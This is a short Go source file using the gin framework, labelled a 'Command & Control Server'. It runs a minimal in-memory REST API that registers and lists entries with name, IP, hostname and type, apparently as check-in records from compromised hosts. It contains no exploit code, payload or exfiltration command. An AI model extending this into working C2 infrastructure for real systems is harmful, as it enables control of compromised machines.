package main
import (
  "fmt"
  "net/http"
  "github.com/gin-gonic/gin"
)

// /reg/ setup...
type register struct {
  Name      string  `json:"name"`    // random name
  IP        string  `json:"ip"`      // public IP
  Hostname  string  `json:"host"`    // hostname
  Type      string  `json:"type"`    // type
}

var users = []register{
  {Name:"Baltazar", IP:"192.168.88.252", Hostname:"baltazar", Type:"POST"},
  {Name:"Bajker s Marsa", IP:"192.168.0.1", Hostname:"mars-rover", Type:"POST"},
  {Name:"Gargamel", IP:"192.168.88.254", Hostname:"gargamel", Type:"GET"},
}

func getUsers(c *gin.Context) {
  c.IndentedJSON(http.StatusOK, users)
}

func addUser(c *gin.Context) {
  var newUser register

  if err := c.BindJSON(&newUser); err != nil {
    return
  }

  users = append(users, newUser)
  c.IndentedJSON(http.StatusCreated, newUser)
}

func getUserByName(c *gin.Context) {
  name := c.Param("name")

  for _, a := range users {
    if a.Name == name {
      c.IndentedJSON(http.StatusOK, a)
      return
    }
  }
  c.IndentedJSON(http.StatusNotFound, gin.H{"message": "user not found"})
}

func main() {
  var IP string
  var Port string

  fmt.Println("---------[ Command & Control Server ]---------")
  fmt.Print("Host IP: ")
  fmt.Scanln(&IP)
  fmt.Print("Host Port: ")
  fmt.Scanln(&Port)

  /*---------[ HTTP STUFF ]---------*/
  router := gin.Default()
  router.GET("/users", getUsers)
  router.POST("/users", addUser)
  router.GET("/users/:name", getUserByName)
  router.Run(IP+":"+Port)
}
